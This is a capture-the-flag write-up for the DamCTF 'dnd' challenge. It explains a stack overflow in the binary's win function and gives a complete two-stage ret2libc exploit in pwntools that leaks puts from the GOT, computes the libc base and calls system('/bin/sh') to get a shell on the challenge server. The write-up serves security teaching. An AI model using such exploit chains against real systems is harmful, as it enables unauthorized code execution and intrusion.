---
title: Dam_CTF
published: 2025-08-21
description: A walkthrough for challenge DND from Dam_CTF.
tags: [Pwn, Writeups, Ret2Libc]
category: Pwn
draft: false
---

Mitigations:
```bash
󰣇 dam_ctf/pwn/dnd_chall ❯ file dnd                                                                                                  
dnd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=44872667ee2a19d1c8f314775e8e3018619c6d9a, for GNU/Linux 3.2.0, not stripped
󰣇 dam_ctf/pwn/dnd_chall ❯ checksec --file=dnd                                                                                       
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   209 Symbols	 No	0		1		dnd
```
this is dynamically linked, no canary , no pie but nx is enabled.  

```bash
we got three files
1. dnd - binary file
2. libc.so.6 - libc file
3. ld-linux-x86-64.so.2 - linker file
```

So i thought of performing ret2libc attack , now lets gets started.  

from the decompiled code:  
```cpp
void win(void)

{
  basic_ostream *pbVar1;
  char local_68 [32];
  basic_string local_48 [9];
  allocator local_21;
  allocator *local_20;
  
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "Congratulations! Minstrals will sing of your triumphs for millenia to co me."
                          );
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  std::operator<<((basic_ostream *)std::cout,"What is your name, fierce warrior? ");
  fgets(local_68,0x100,stdin);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"We will remember you forever, ");
  local_20 = &local_21;
                    /* try { // try from 004028eb to 004028ef has its CatchHandler @ 0040293c */
  std::__cxx11::basic_string<>::basic_string<>((basic_string<> *)local_48,local_68,&local_21);
                    /* try { // try from 004028fa to 0040290b has its CatchHandler @ 00402927 */
  pbVar1 = std::operator<<(pbVar1,local_48);
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1,std::endl<>);
  std::__cxx11::basic_string<>::~basic_string((basic_string<> *)local_48);
  std::__new_allocator<char>::~__new_allocator((__new_allocator<char> *)&local_21);
  return;
}
```

we can see that,in the win function there is buffer overflow. so with it we can control instruction execution, to go there we need to attack the monster that is coming on our way , and well we need to die.
just kidding.
after our health reaches below 0 , we can go to win function , and then we can play with the overflow...

then again to perform ret2libc attack , we need to defeat the ASLR , eventhough there is no pie , the libc address are randomised due the ASLR in our system , so some how we need to leak the libc address , then again i thought of leaking the puts address from the GOT entries.

our attack plan:
```
1. go to win function
2. buffer overflow - control ret 
3. leak the libc address and again go to main
4. then call the system with bin/sh.
```
then :
we can find the offset to be 104 with cyclic patterns. 

lets make our first payload,
```python
payload = flat (
	cyclic(offset),
	ret,
	rdi_rbp,
	elf.got['puts'],
	0xdeadbeefdeadbeef,
	elf.plt['puts'],
	elf.sym['main']
)
```
this above payload leaks the libc address of the puts , so we can find the libc address of it.
how does the leak takes place here with the rdi gadget the puts@got is actually as argument for the put@plt , which call puts , it just prints the memory of the address it points to , here we send puts@got , so it will looks like , puts(puts@got) , so it will print the libc address.

to calculate the base address of the libc , we are actually sub the leaked libc with the puts libc offset. since the leaked libc is the puts libc address.
```
libc_base = libc_leak - libc.symbols['puts']
```

after leaking the libc address , we need to calculate the libc base to find the correct address of the system and the /bin/sh , to craft a syscall to get the shell.
second payload :
```python
rdi = 0x000000000010f75b
pop_rdi = libc_base + rdi
payload = flat (
	cyclic(offset),
	ret,
	pop_rdi,
	binsh,
	system
	)
```
this will loads the address of the bin/sh in to rdi and then , make the system to call the shell.

in case of any mistake , do connect in discord: 0xhyder
Solve Script:
```python
from pwn import *

elf = context.binary = ELF('./dnd')
libc = ELF('libc.so.6', checksec=False)
env = None
context.terminal = ['kitty', '-e']

gdbscript = '''
b*main
b*0x000000000040201a
b*0x0000000000402640
c
'''
ld_path = './ld-linux-x86-64.so.2'
libc_path = './libc.so.6'
argv = [ld_path, '--library-path', '.', elf.path]

if args.REMOTE:
	p = remote('dnd.chals.damctf.xyz',30813)
elif args.GDB:
	p = gdb.debug(argv, gdbscript=gdbscript, env=env)
else:
	p = process(argv, env=env)

def handle_attack_or_run():
	try:
		while True:
			line = p.recv(1024) # Adjust size as needed
			log.info(f"Received: {line.strip()}")
			if b'[a]ttack or [r]un' in line:
				p.sendline(b'a')
			elif b'fierce warrior' in line:
				log.success("Reached payload prompt!")
				break
			elif b'You lost!' in line:
				log.warning('Completed all five rounds.')
	except EOFError:
		log.error("EOF received. The process might have crashed.")
		p.close()
		exit()
	except Exception as e:
		log.error(f"Unexpected error: {e}")
		p.close()
		exit()
  
def send_payload():
	payload = flat (
	cyclic(offset),
	ret,
	rdi_rbp,
	elf.got['puts'],
	0xdeadbeefdeadbeef,
	elf.plt['puts'],
	elf.sym['main']
)
p.sendline(payload)

# ======================= Stage 1: Leak =======================
handle_attack_or_run()

ret = 0x000000000040201a
rdi_rbp = 0x0000000000402640
offset = 104

send_payload()
p.recvuntil(b'forever,')
leaked_line = p.recvuntil(b'#').strip()
leak = leaked_line[0x27:0x27+6]
libc_leak = u64(leak.ljust(8, b'\x00'))
log.success(f"[*] Leaked libc address: {hex(libc_leak)}")
libc_base = libc_leak - libc.symbols['puts']
log.success(f"[*] base libc address: {hex(libc_base)}")
binsh = next(libc.search(b'/bin/sh')) + libc_base
system = libc.symbols['system'] + libc_base
log.success(f"[*] binsh libc address: {hex(binsh)}")
log.success(f"[*] system libc address: {hex(system)}")

# ======================= Stage 2: Exploit=======================
handle_attack_or_run()

rdi = 0x000000000010f75b
pop_rdi = libc_base + rdi
payload = flat (
	cyclic(offset),
	ret,
	pop_rdi,
	binsh,
	system
)
p.sendline(payload)

p.interactive()
```
